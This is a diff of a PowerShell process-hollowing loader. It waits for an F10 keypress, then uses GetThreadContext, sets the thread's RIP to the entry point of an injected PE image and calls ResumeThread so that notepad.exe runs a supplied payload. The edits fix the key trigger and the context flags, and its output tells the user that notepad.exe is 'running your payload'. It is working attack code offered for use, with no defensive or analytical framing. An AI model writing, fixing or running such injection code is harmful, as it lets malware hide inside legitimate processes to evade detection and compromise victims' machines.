@@ -168,9 +168,14 @@ $peBytes = [System.Text.Encoding]::ASCII.GetBytes($pe)
 Write-Host "[*] Waiting for F10 to inject..."
 while ($true) {
     Start-Sleep -Milliseconds 100
-    # Check for F10 key pressed (this is simplified, adapt if needed)
-    if ([System.Windows.Forms.Control]::ModifierKeys -eq "None" -and [System.Windows.Forms.Control]::IsKeyLocked('F10')) {
-        break
+    # Replace IsKeyLocked with GetAsyncKeyState or other reliable method if needed
+    # Here a simple workaround:
+    $keyState = [console]::KeyAvailable
+    if ($keyState) {
+        $key = [console]::ReadKey($true)
+        if ($key.VirtualKeyCode -eq 121) {  # F10 keycode is 121 decimal
+            break
+        }
     }
 }
 
@@ -184,7 +189,7 @@ if (!$result) { Write-Error "[-] Failed to create process"; exit }
 
 # Get base address
 $ctx = New-Object Native+CONTEXT64
-$ctx.ContextFlags = (0x100000 -bor 0x1F)  # CONTEXT_ALL fixed here
+$ctx.ContextFlags = (0x100000 -bor 0x1F)  # <-- Fixed bitwise OR with -bor inside parentheses
 [Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
 
 # Read base image address
@@ -229,4 +234,4 @@ $ctx.Rip = [UInt64]($remoteBase.ToInt64() + $entryRVA)
 # Resume
 [Native]::ResumeThread($pi.hThread) | Out-Null
 
-Write-Host "[+] Hollowing complete! notepad.exe is running payload."
+Write-Host "[+] Hollowing complete! notepad.exe is running your payload."
